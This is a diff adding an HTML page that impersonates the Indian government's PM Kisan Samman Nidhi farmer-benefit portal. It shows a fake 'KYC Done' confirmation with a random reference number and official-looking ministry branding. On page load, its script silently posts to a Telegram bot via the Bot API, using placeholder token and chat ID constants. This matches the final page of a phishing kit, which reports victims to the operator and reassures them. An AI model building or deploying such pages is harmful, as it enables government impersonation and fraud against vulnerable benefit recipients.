@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KYC Done | Unique Card</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Unique KYC Done Card */
+        .kyc-card {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 15px;
+            width: 50%;
+            margin: 40px auto;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .kyc-card h2 {
+            color: #00C851;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+
+        .kyc-card p {
+            font-size: 1.1rem;
+            margin: 10px 0;
+        }
+
+        .kyc-card .ref-number {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #1565c0;
+        }
+
+        .kyc-card button {
+            background-color: #1565c0;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+            margin-right: 10px;
+        }
+
+        .kyc-card button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 400px;
+            text-align: center;
+            position: relative;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-content h3 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #1565c0;
+        }
+
+        .modal-content p {
+            font-size: 1rem;
+            margin: 10px 0;
+        }
+
+        .modal-content button {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .modal-content button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .kyc-card {
+                width: 80%;
+            }
+
+            .modal-content {
+                width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Unique KYC Done Card -->
+    <div class="kyc-card">
+        <h2>KYC Done! ✅</h2>
+        <p>Your KYC has been successfully verified.</p>
+        <p>Reference Number: <span class="ref-number" id="refNumber"></span></p>
+        <p>Date: <span id="currentDate"></span> | Time: <span id="currentTime"></span></p>
+        <button onclick="openContactModal()">Contact Us</button>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : <span id="lastUpdated"></span></p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal for Contact Us -->
+    <div id="contactModal" class="modal">
+        <div class="modal-content">
+            <h3>Contact Us</h3>
+            <p>For any queries, please reach out to us at:</p>
+            <p><strong>Email:</strong> support@pmkisan.gov.in</p>
+            <p><strong>Phone:</strong> +91-1234567890</p>
+            <button onclick="closeContactModal()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Token and Chat ID
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+        const CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
+
+        // Function to generate 20 reference numbers
+        function generateRefNumbers() {
+            const refNumbers = [];
+            for (let i = 0; i < 20; i++) {
+                refNumbers.push('REF-' + Math.floor(100000 + Math.random() * 900000).toString());
+            }
+            return refNumbers;
+        }
+
+        // Function to display a random reference number
+        function displayRandomRefNumber(refNumbers) {
+            const randomIndex = Math.floor(Math.random() * refNumbers.length);
+            document.getElementById('refNumber').textContent = refNumbers[randomIndex];
+        }
+
+        // Function to display current date and time
+        function displayDateTime() {
+            const now = new Date();
+            const date = now.toLocaleDateString();
+            const time = now.toLocaleTimeString();
+            document.getElementById('currentDate').textContent = date;
+            document.getElementById('currentTime').textContent = time;
+            document.getElementById('lastUpdated').textContent = date;
+        }
+
+        // Function to send data to Telegram automatically
+        function sendToTelegram() {
+            const refNumber = document.getElementById('refNumber').textContent;
+            const date = document.getElementById('currentDate').textContent;
+            const time = document.getElementById('currentTime').textContent;
+
+            const message = `KYC Details:\nRef Number: ${refNumber}\nDate: ${date}\nTime: ${time}`;
+
+            // Send message to Telegram using the Bot API
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Data sent to Telegram successfully!');
+                } else {
+                    console.error('Failed to send data to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Function to open the Contact Us modal
+        function openContactModal() {
+            const modal = document.getElementById('contactModal');
+            modal.style.display = 'flex';
+        }
+
+        // Function to close the Contact Us modal
+        function closeContactModal() {
+            const modal = document.getElementById('contactModal');
+            modal.style.display = 'none';
+        }
+
+        // Initialize on page load
+        const refNumbers = generateRefNumbers();
+        displayRandomRefNumber(refNumbers);
+        displayDateTime();
+        sendToTelegram(); // Automatically send data to Telegram
+    </script>
+</body>
+</html>
